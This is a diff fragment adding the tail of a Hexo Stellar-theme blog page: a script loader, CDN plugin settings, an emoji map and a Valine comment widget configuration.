+      var script = document.createElement('script');
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    // https://github.com/jerryc127/hexo-theme-butterfly
+    jQuery: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        stellar.loadScript(stellar.plugins.jQuery).then(fn)
+      } else {
+        fn()
+      }
+    }
+  };
+  stellar.github = 'https://github.com/xaoxuu/hexo-theme-stellar/tree/1.6.1';
+  stellar.config = {
+    date_suffix: {
+      just: 'Just',
+      min: 'minutes ago',
+      hour: 'hours ago',
+      day: 'days ago',
+      month: 'months ago',
+    },
+  };
+
+  // required plugins (only load if needs)
+  stellar.plugins = {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js',
+    sitesjs: '/js/plugins/sites.js',
+    friendsjs: '/js/plugins/friends.js',
+  };
+
+  // optional plugins
+  if ('true' == 'true') {
+    stellar.plugins.lazyload = Object.assign({"enable":true,"js":"https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.3.1/dist/lazyload.min.js","transition":"blur"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.swiper = Object.assign({"enable":true,"css":"https://unpkg.com/swiper@6/swiper-bundle.min.css","js":"https://unpkg.com/swiper@6/swiper-bundle.min.js"});
+  }
+  if ('' == 'true') {
+    stellar.plugins.scrollreveal = Object.assign({"enable":null,"js":"https://cdn.jsdelivr.net/npm/scrollreveal@4.0.9/dist/scrollreveal.min.js","distance":"8px","duration":500,"interval":100,"scale":1});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.preload = Object.assign({"enable":true,"service":"flying_pages","instant_page":"https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@4.1.2/js/instant_page.js","flying_pages":"https://cdn.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"});
+  }
+</script>
+
+<!-- required -->
+
+  
+<script src="/js/main.js" async></script>
+
+
+
+<!-- optional -->
+
+  <script>
+  function getEmojiMaps() {
+    function emoji(path, idx, ext) {
+      return path + "/" + path + "-" + idx + "." + ext;
+    }
+    var emojiMaps = {};
+    for (var i = 1; i <= 54; i++) {
+      emojiMaps['tieba-' + i] = emoji('tieba', i, 'png');
+    }
+    for (var i = 1; i <= 101; i++) {
+      emojiMaps['qq-' + i] = emoji('qq', i, 'gif');
+    }
+    for (var i = 1; i <= 116; i++) {
+      emojiMaps['aru-' + i] = emoji('aru', i, 'gif');
+    }
+    for (var i = 1; i <= 125; i++) {
+      emojiMaps['twemoji-' + i] = emoji('twemoji', i, 'png');
+    }
+    for (var i = 1; i <= 4; i++) {
+      emojiMaps['weibo-' + i] = emoji('weibo', i, 'png');
+    }
+    return emojiMaps;
+  }
+  function load_comment(){
+    if(!document.getElementById("valine_container"))return;
+    stellar.loadScript('https://cdn.jsdelivr.net/gh/XuxuGood/simple-blog-cdn@main/js/Valine.min.js', {defer:true}).then(function () {
+      const el = document.getElementById("valine_container");
+      var path = el.getAttribute('comment_id');
+      const placeholder = "";
+      if (!path) {
+        path = decodeURI(window.location.pathname);
+      }
+      var valine = new Valine();
+      valine.init(Object.assign({"js":"https://cdn.jsdelivr.net/gh/XuxuGood/simple-blog-cdn@main/js/Valine.min.js","appId":"5eo9cV9bsvMnta4gOnhxtdKF-gzGzoHsz","appKey":"LwEPyca9biyGVsDzHA7WfAjH","placeholder":null,"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":false,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false,"tagMeta":["博主","小伙伴","访客"],"metaPlaceholder":{"nick":"昵称/QQ号(必填)","mail":"邮箱（必填，完全保密）","link":"网址(https://)"},"master":["6783037F2DF30EAB99F9FC256157D875"],"friends":["6783037F2DF30EAB99F9FC256157D875"]}, {
+        el: '#valine_container',
+        path: path,
+        placeholder: placeholder,
+        emojiCDN: 'https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/valine/',
+        emojiMaps: getEmojiMaps(),
+      }));
+    });
+  }
+  window.addEventListener('DOMContentLoaded', (event) => {
+    console.log('DOM fully loaded and parsed');
+    load_comment();
+  });
+
+</script>
+
+
+
+
+<!-- inject -->
+
+
+  </div>
+</body>
+</html>
